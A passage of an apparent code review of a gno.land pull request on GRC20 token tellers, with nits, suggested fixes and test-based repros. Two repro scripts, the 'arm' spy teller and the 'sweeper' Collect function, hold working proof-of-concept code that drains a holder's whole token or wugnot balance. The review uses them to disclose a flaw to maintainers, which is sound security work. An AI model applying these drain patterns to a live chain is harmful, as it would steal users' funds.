	uassert.AbortsContains(t, cur, "user teller requires a direct EOA call", func() {
		UserTransferFrom(cross(cur), tokenKey, alice, bob, 1)
	})
	uassert.Equal(t, int64(700), token.BalanceOf(alice))
	uassert.Equal(t, int64(100), token.Allowance(alice, carol))
}

// TestUserHelpersRefuseAnUnregisteredToken pins the one bound left on the
// helpers: the token has to be in the registry.
func TestUserHelpersRefuseAnUnregisteredToken(cur realm, t *testing.T) {
	alice := testutils.TestAddress("alice")
	bob := testutils.TestAddress("bob")

	testing.SetRealm(testing.NewUserRealm(alice))
	uassert.AbortsContains(t, cur, "unknown token", func() {
		UserTransfer(cross(cur), "gno.land/r/demo/never_registered.NONE", bob, 1)
	})
}
```
</details>

## examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno:33-35 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L33-L35) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L33)
Nit: the check cannot fail, because the preprocessor refuses any first argument to a crossing function other than `cur` or `cross(rlm)`, `cross()` validates `IsCurrent` before the call is entered, and a non-crossing call from another package is refused at preprocess time. Drop the check, or name the caller it is for.

<details><summary>probes</summary>

Four callers built from outside the package, each stopped before `Register` ran.

```
only `cur` or `cross(rlm)` are allowed as the first argument to a crossing function
cannot persist realm value: realm values are ephemeral and tied to a call frame
cross: rlm is not the current cur (stale capture or sibling frame)
cannot cur-call to external realm function gno.land/r/demo/defi/grc20reg.grc20reg<VPBlock(2,1)>.Register from gno.land/r/test/zzprobe
```
</details>

## examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno:10-16 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno#L10-L16) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno#L10)
Nit: this package stores a caller-supplied implementation and invokes it holding the realm's own live `cur`, which is the shape [`examples/gno.land/r/tests/vm/`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/tests/vm/README.md?plain=1#L1) collects and [`crossrealm`](https://github.com/gnolang/gno/blob/d43dc0c5019ec8106df2ceca119776e1b846dfc7/examples/gno.land/r/tests/vm/crossrealm/crossrealm.gno#L143-L149) already ships there, so it belongs in that directory rather than one level above it, where [`start.go:451-455`](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/cmd/gnoland/start.go#L451-L455) loads it into genesis beside production packages.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_leak_user_drain.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/demo/defi/grc20reg
loadpkg gno.land/r/tests/grc20_user_teller_leak
loadpkg gno.land/r/test/leaktok $WORK/leaktok
loadpkg gno.land/r/test/arm $WORK/arm

adduser alice
adduser mallory

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'
gnokey maketx send -send 50000000ugnot -to $mallory_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/test/leaktok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/leaktok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# Store is unauthenticated: mallory plants her own implementation.
gnokey maketx call -pkgpath gno.land/r/test/arm -func Plant -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test mallory
stdout OK

# alice makes one direct MsgCall on the genesis fixture, naming her own address
# and 1 token. The arguments are ignored.
gnokey maketx call -pkgpath gno.land/r/tests/grc20_user_teller_leak -func Transfer -args $alice_user_addr -args 1 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK

gnokey query vm/qeval --data "gno.land/r/test/leaktok.BalanceOf(\"$alice_user_addr\")"
# stdout '0 int64'         # IS:     the planted callback spends the caller's balance
stdout '1000000 int64' # SHOULD: a fixture realm never hands its frame to an implementer it does not control
gnokey query vm/qeval --data "gno.land/r/test/arm.Take()"
stdout '1000000 int64'

-- leaktok/gnomod.toml --
module = "gno.land/r/test/leaktok"
gno = "0.9"

-- leaktok/leaktok.gno --
package leaktok

import (
	"gno.land/p/demo/tokens/grc20"
	"gno.land/r/demo/defi/grc20reg"
)

var (
	token *grc20.Token
	adm   *grc20.PrivateLedger
)

func init(cur realm) {
	token, adm = grc20.NewToken("LeakTok", "LEAK", 4, 0, cur)
	grc20reg.Register(cross(cur), token, "")
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }

-- arm/gnomod.toml --
module = "gno.land/r/test/arm"
gno = "0.9"

-- arm/arm.gno --
package arm

import (
	"chain"

	"gno.land/r/demo/defi/grc20reg"
	"gno.land/r/tests/grc20_user_teller_leak"
)

const key = "gno.land/r/test/leaktok.LEAK"

type spy struct{}

// Transfer satisfies the fixture's teller interface. rlm arrives as the
// fixture's own live cur, whose Previous() is the EOA that called the fixture,
// so UserTeller resolves that EOA as the actor.
func (s *spy) Transfer(_ int, rlm realm, to address, amount int64) error {
	tok := grc20reg.MustGet(key)
	victim := rlm.Previous().Address()
	bal := tok.BalanceOf(victim)
	if bal == 0 {
		return nil
	}
	return tok.UserTeller().Transfer(0, rlm, chain.PackageAddress("gno.land/r/test/arm"), bal)
}

func Plant(cur realm) {
	grc20_user_teller_leak.Store(cross(cur), &spy{})
}

func Take() int64 {
	return grc20reg.MustGet(key).BalanceOf(chain.PackageAddress("gno.land/r/test/arm"))
}
TXTAR
go test -run 'TestTestdata/zz_leak_user_drain' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_leak_user_drain.txtar
```

An attacker arms the fixture once, the holder makes one ordinary call naming herself and 1 token, and the assertion on her remaining balance fails because all of it moved. `adduser` mints a fresh mnemonic per run, so the holder's address below is one run's value.

```
> gnokey maketx call -pkgpath gno.land/r/tests/grc20_user_teller_leak -func Transfer -args $alice_user_addr -args 1 ... alice
EVENTS: [{"type":"Transfer","attrs":[{"key":"token","value":"gno.land/r/test/leaktok.LEAK.0000000"},{"key":"from","value":"g1783xu9jpxwhcywmwpqw56p4xrnds8nt2jnredm"},{"key":"to","value":"g1q8cn0av7w7v3y9lccxfund4vckku25hapywplf"},{"key":"value","value":"1000000"}]}]
> gnokey query vm/qeval --data "gno.land/r/test/leaktok.BalanceOf(\"$alice_user_addr\")"
data: (0 int64)
> stdout '1000000 int64'
FAIL: testdata/zz_leak_user_drain.txtar:33: no match for `1000000 int64` found in stdout
```

Testscript stops at the failed assertion, so the `arm.Take()` line under it is not reached; it reads `1000000 int64` on a run with the `SHOULD` line replaced by its `IS` value.
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:44-56 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L44-L56) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L44)
Suggestion: this reach is the intended model, which the [ADR's Consequences](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L36-L40) accepts for a realm the user calls directly and its [closing sentence](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L45-L46) concedes for non-crossing code holding a live `cur`. A token realm has no way to decline, since publishing the pointer grants the model, so a per-token switch defaulting off would put the choice back with the author:

- Tokens already loaded into genesis pick the capability up from their published pointer alone, [`wugnot`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L15-L29), [`foo20`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/foo20/foo20.gno#L15), [`test20`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/tests/vm/test20/test20.gno#L17) and every token [`grc20factory`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20factory/grc20factory.gno#L53) mints among them.
- Real GNOT follows them, since neither wugnot's [`AssertOriginCall`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L35) guards nor its home-confined [`CallerTeller`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L90) wrappers sit in the path.
- An honest realm that hands its live `cur` to a non-crossing helper debits its own caller, one hop past the direct call [`tellers.gno:42-43`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L42-L43) warns about.
- Nothing has to be deployed to reach a holder, because [`crossrealm.gno:147-149`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/tests/vm/crossrealm/crossrealm.gno#L147-L149) is in genesis and hands its live `cur` to caller-installed code from a zero-argument entry point.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_wugnot_holder.txtar <<'TXTAR'
loadpkg gno.land/r/gnoland/wugnot
loadpkg gno.land/r/test/sweeper $WORK/sweeper

adduser alice

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/gnoland/wugnot -func Deposit -send 1000000ugnot -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# wugnot's own transfer wrapper is backed by adm.CallerTeller(), which debits
# whoever crossed into wugnot. Reached from the sweeper that is the sweeper, so
# the sweeper spends its own empty balance and alice is untouched.
! gnokey maketx call -pkgpath gno.land/r/test/sweeper -func ViaWugnotWrapper -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stderr 'insufficient balance'
gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# The same sweeper reaches the same balance through the published *Token.
gnokey maketx call -pkgpath gno.land/r/test/sweeper -func Collect -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
# stdout '0 int64'         # IS:     a realm alice calls once takes her whole wugnot balance
stdout '1000000 int64' # SHOULD: a token author decides whether a foreign realm may act for holders
gnokey query vm/qeval --data "gno.land/r/test/sweeper.Take()"
stdout '1000000 int64'

-- sweeper/gnomod.toml --
module = "gno.land/r/test/sweeper"
gno = "0.9"

-- sweeper/sweeper.gno --
package sweeper

import (
	"chain"

	"gno.land/r/gnoland/wugnot"
)

func self() address { return chain.PackageAddress("gno.land/r/test/sweeper") }

// ViaWugnotWrapper takes the route wugnot's author published. CallerTeller
// resolves the actor as the frame that crossed into wugnot, which is this
// realm, so the sweeper can only spend the sweeper.
func ViaWugnotWrapper(cur realm) {
	wugnot.Transfer(cross(cur), chain.PackageAddress("gno.land/r/test/sink"), 1)
}

// Collect takes the route this branch adds. Nothing in wugnot opted in.
func Collect(cur realm) {
	victim := cur.Previous().Address()
	all := wugnot.Token.BalanceOf(victim)
	if err := wugnot.Token.UserTeller().Transfer(0, cur, self(), all); err != nil {
		panic(err)
	}
}

func Take() int64 { return wugnot.Token.BalanceOf(self()) }
TXTAR
go test -run 'TestTestdata/zz_wugnot_holder' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_wugnot_holder.txtar
```

The script asserts the wugnot balance a holder still has after one signed call into a realm that is not wugnot, and the assertion fails because the balance is gone. `adduser` mints a fresh mnemonic per run, so the holder's address below is one run's value.

```
> gnokey maketx call -pkgpath gno.land/r/test/sweeper -func Collect ... alice
EVENTS: [{"type":"Transfer","attrs":[{"key":"token","value":"gno.land/r/gnoland/wugnot.wugnot.0000000"},{"key":"from","value":"g123qp7atad4mr5qz6tlwvkhmwd2n2zf2xzgm8nl"},{"key":"to","value":"g1w0vhmz02ec86z4yp4qc5tm6g7c3wlqxnc7swm3"},{"key":"value","value":"1000000"}],"pkg_path":"gno.land/p/demo/tokens/grc20"}]
> gnokey query vm/qeval --data "gno.land/r/gnoland/wugnot.BalanceOf(\"$alice_user_addr\")"
data: (0 int64)
> stdout '1000000 int64'
FAIL: testdata/zz_wugnot_holder.txtar:29: no match for `1000000 int64` found in stdout
```

Testscript stops at the failed assertion, so the `sweeper.Take()` line under it is not reached; it reads `1000000 int64` on a run with the `SHOULD` line replaced by its `IS` value. wugnot's own `Transfer` refuses the same sweeper for insufficient balance one step earlier in the script, because [`adm.CallerTeller()`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L90) debits whoever crossed into wugnot.
</details>

## examples/gno.land/p/demo/tokens/grc20/types.gno:155-162 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/types.gno#L155-L162) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/types.gno#L155)
Suggestion: the `*Token` embed promotes the new constructor onto every teller value, so a [`ReadonlyTeller`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L58-L68) handed to another realm lets that realm spend whoever calls it next, even for a token that stays unexported and unregistered; naming the field costs six forwarding methods, since the embed is also what satisfies the read half of [`Teller`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/types.gno#L26-L54).

<details><summary>the edit, and what it changes</summary>

The struct block goes from 8 lines, 155-162, to 21, 155-175. Applied in a worktree: `gno test` passes on `p/demo/tokens/grc20`, `r/demo/defi/grc20reg` and `r/gnoland/wugnot`, the direct-call route the current code intends still passes, and a probe realm asserting `interface{ UserTeller() grc20.Teller }` against a readonly teller handed across a realm boundary drops from `promotes: true` to `promotes: false`.

```diff
 	// userOnly restricts the teller to immediate EOA callers via MsgCall.
 	userOnly bool
-	*Token
+	// Token is named rather than embedded so a teller value handed to another
+	// realm carries no constructor from *Token.
+	Token *Token
+}
+
+func (ft *fnTeller) GetName() string    { return ft.Token.GetName() }
+func (ft *fnTeller) GetSymbol() string  { return ft.Token.GetSymbol() }
+func (ft *fnTeller) GetDecimals() int   { return ft.Token.GetDecimals() }
+func (ft *fnTeller) TotalSupply() int64 { return ft.Token.TotalSupply() }
+
+func (ft *fnTeller) BalanceOf(account address) int64 { return ft.Token.BalanceOf(account) }
+
+func (ft *fnTeller) Allowance(owner, spender address) int64 {
+	return ft.Token.Allowance(owner, spender)
 }
```
</details>

## examples/gno.land/r/gnoland/wugnot/filetests/eoa_surface_filetest.gno:1-47 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/filetests/eoa_surface_filetest.gno#L1-L47) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/gnoland/wugnot/filetests/eoa_surface_filetest.gno#L1)
Suggestion: the 47 lines exercise deposit, approve, transferFrom, transfer and an intermediate-realm refusal through wugnot's [`CallerTeller` wrappers](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L89-L102), which this branch does not touch, so the filetest pins behaviour that already holds rather than the user-teller surface this branch adds; say that in its header if the intent is a regression pin, or move the four writes into the new user-teller txtars.

<details><summary>where it passes</summary>

The filetest passes against the `examples/` tree at the merge base with the branch's own `gno` binary, gas 9,145,698 there against 9,150,829 here, and `wugnot.gno` is byte-identical between the two trees.
</details>

## SKIP examples/gno.land/p/demo/tokens/grc20/tellers.gno:169-175 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L169-L175) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L169)
Refactor: the three write methods each open with the same four statements, three guard blocks and the account lookup, and differ only in the ledger call, so folding them into one helper takes the block from 41 lines to 37.

<details><summary>the edit, and what it was run against</summary>

The helper takes `_ int` in first position because a method whose first parameter is a realm is read as crossing and the preprocessor then demands the name `cur`. `gno test` passes on `p/demo/tokens/grc20`, `r/demo/defi/grc20reg` and `r/gnoland/wugnot`, and `grc20_registry_user_relay`, `grc20_userteller_msgcall`, `grc20_callerteller_home` and `grc20_token_no_caller_teller` pass unchanged.

```diff
+// actor runs every check a write owes and returns the account it debits.
+func (ft *fnTeller) actor(_ int, rlm realm) (address, error) {
+	if ft.accountFn == nil {
+		return "", ErrReadonly
+	}
+	if !rlm.IsCurrent() {
+		return "", ErrSpoofedRealm
+	}
+	if err := ft.guardWrite(0, rlm); err != nil {
+		return "", err
+	}
+	return ft.accountFn(0, rlm), nil
+}
+
 func (ft *fnTeller) Transfer(_ int, rlm realm, to address, amount int64) error {
-	if ft.accountFn == nil {
-		return ErrReadonly
-	}
-	if !rlm.IsCurrent() {
-		return ErrSpoofedRealm
-	}
-	if err := ft.guardWrite(0, rlm); err != nil {
+	caller, err := ft.actor(0, rlm)
+	if err != nil {
 		return err
 	}
-	caller := ft.accountFn(0, rlm)
 	return ft.Token.ledger.Transfer(caller, to, amount)
 }
```

The same fold applies to `Approve` and `TransferFrom`.
</details>

Skipped. The branch renamed one call inside a prologue that already repeated.

## SKIP examples/gno.land/p/demo/tokens/grc20/tellers.gno:20-23 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L20-L23) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L20)
Nit: "the write methods therefore also verify that the invoking realm is the token's own (see guardWrite), which makes a leaked teller inert everywhere but home" sits 21 lines above a frame-relative teller that verifies no such thing and is live in any realm.

Skipped. The paragraph is scoped to `CallerTeller` and still holds for that accessor.

## SKIP examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno:111-114 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L111-L114) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L111)
Nit: the three lines above 114 still say "a signing user cannot reach these at all", which fits the realm wrappers under them, [`Transfer`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L121), [`Approve`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L128) and [`TransferFrom`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L139), and not the user entry points [line 114 now points at](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg.gno#L145).

Skipped. Comment wording, no behaviour.

## SKIP examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno:77-79 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L77-L79) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L77)
Nit: the rename to `TestRegistryRealmTellerSpendsAllowance` dropped the comment pinning that a `*Token` alone carries no authority to debit anybody, and the two lines that replaced it do not say the invariant is gone.

Skipped. The branch retires that invariant on purpose, so only the silence is the gap.

## SKIP gno.land/pkg/integration/testdata/grc20_userteller_msgcall.txtar:3-4 [gh](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/pkg/integration/testdata/grc20_userteller_msgcall.txtar#L3-L4) · [↗](../../../../../.worktrees/gno-review-6123/gno.land/pkg/integration/testdata/grc20_userteller_msgcall.txtar#L3)
Nit: "This is the path UserTeller exists to restore: the writes stay callable by an EOA without a `maketx run`" describes a path present at the merge base, where plain `maketx call` drives wugnot's deposit, transfer, approve and transferFrom through the [`CallerTeller` wrappers](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L89-L102) that predate the branch.

Skipped. Comment wording, no behaviour.
